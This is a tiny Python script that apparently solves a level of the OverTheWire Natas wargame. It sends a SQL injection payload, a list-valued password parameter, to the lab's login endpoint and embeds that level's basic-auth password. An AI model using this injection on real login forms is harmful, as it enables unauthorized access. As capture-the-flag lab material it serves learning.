#1/usr/bin python

import requests

def vuln(url):
    params={"username": "natas31", "password": ["'lol' or 1", 4]}
    print(requests.post(url, data=params, auth=("natas30", "wie9iexae0Daihohv8vuu3cei9wahf0e")).text)

vuln('http://natas30.natas.labs.overthewire.org/')